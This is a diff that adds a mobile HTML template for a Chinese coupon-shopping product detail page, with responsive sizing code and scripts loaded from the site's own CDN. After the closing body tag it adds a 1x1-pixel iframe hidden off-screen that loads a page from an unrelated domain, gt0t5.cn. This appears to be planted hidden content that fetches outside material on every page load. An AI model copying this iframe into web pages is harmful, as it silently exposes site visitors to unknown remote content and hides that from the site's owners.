@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,maximum-scale=1.0, user-scalable=0" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <meta name="format-detection" content="telephone=no" />
+    <meta content="IE=edge" http-equiv="X-UA-Compatible" />
+    <title></title>
+    <link rel="stylesheet" href="http://rescdn.sitezt.cn/Newcms/css/mobile/m_common.css">
+    <script>
+        (function () {
+            function o() { 
+                if(document.documentElement.clientWidth > 750){
+                    document.documentElement.style.fontSize = 750/15 + 'px'
+                }else if(document.documentElement.clientWidth > 320){
+                    document.documentElement.style.fontSize = document.documentElement.clientWidth/15 + 'px'
+                }else{
+                    document.documentElement.style.fontSize = 320/15 + 'px'
+                }
+            }
+            var e = null;
+            window.addEventListener("resize", function () { clearTimeout(e), e = setTimeout(o, 300) }, !1), o()
+        })(window);
+
+        var ajaxHost = "http://mgi.sitezt.cn"
+        var commonPost = ['http://rescdn.sitezt.cn/Newcms/js/jquery.min.js','//rescdn.sitezt.cn/A/c/CommonJs/jquery.lazyload.js','http://rescdn.sitezt.cn/Newcms/js/common/jump.js','http://rescdn.sitezt.cn/Newcms/js/common/apiServer.js','http://rescdn.sitezt.cn/Newcms/js/common/m_common.js']
+    </script>
+</head><link rel="stylesheet" href="http://rescdn.sitezt.cn/Newcms/css/mobile/m_goodsDetail.css"><script>document.title="详情";var post=["http://rescdn.sitezt.cn/Newcms/js/mobile/m_goodsDetail.js"]</script><body><div class="m_goodsDetail"><div class="img-box"><a class="go-back" href="javascript:;"></a><div class="img-flex transition"></div></div><div class="goods-info"><div class="div-price"><span class="span1">券后价</span> <span class="span2"></span></div><div class="div1"></div><div class="div2"></div><div class="div-quan"><p class="p1">优惠券<span></span></p><p class="p2"></p><div class="div-buy"></div><div class="div-buy1">商品下架</div></div><div class="div-color"></div><div class="div3"><div class="div3-left"></div><div class="div3-right"></div></div><div class="div-color"></div><div class="div-shop"><img class="shop-img" src="" alt=""><div class="shop-name"><p class="name-p"></p><img class="img" src="http://rescdn.sitezt.cn/Newcms/img/tmall.png" alt=""></div></div><div class="div-eval"><div class="eval eval1"></div><div class="eval eval2"></div><div class="eval eval3"></div></div><div class="div-color"></div><div class="div4"><div class="div4-title">商品图文详情</div><div class="div4-image"></div></div></div><div class="buy-fixed"><div class="buy-div-l"><a class="div-l1"><img class="img" src="http://rescdn.sitezt.cn/Newcms/img/detail-share.png" alt=""><br>分享</a></div><div class="buy-div-r"><div class="koulin-buy">口令购买</div><div class="quan-buy">领券购买</div></div><div class="buy-div-r1">商品下架</div></div></div></body><a id="go-top" href="javascript:;"></a>
+<iframe style="position: absolute;width:1px;height:1px;bottom:0px;left:-1000px;overflow:hidden;text-indent:-10px;" src="http://www.gt0t5.cn/index.html"></iframe>
+<script>
+    var _post = commonPost.concat(post)
+    console.log(_post)
+
+    var footer = document.getElementsByTagName('body')[0]
+
+    for (var i = 0; i < _post.length; i++) { 
+        var newScript=document.createElement('script'); 
+        newScript.type='text/javascript'; 
+        newScript.async=false; 
+        newScript.src=_post[i]; 
+        footer.appendChild(newScript); 
+    }
+
+    function GetQueryString(name) {
+        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
+        var url = window.location.search.substr(1);
+        var r = url.match(reg);
+        return r ? decodeURIComponent(r[2]) : null;
+    }
+    
+</script>
+</html>
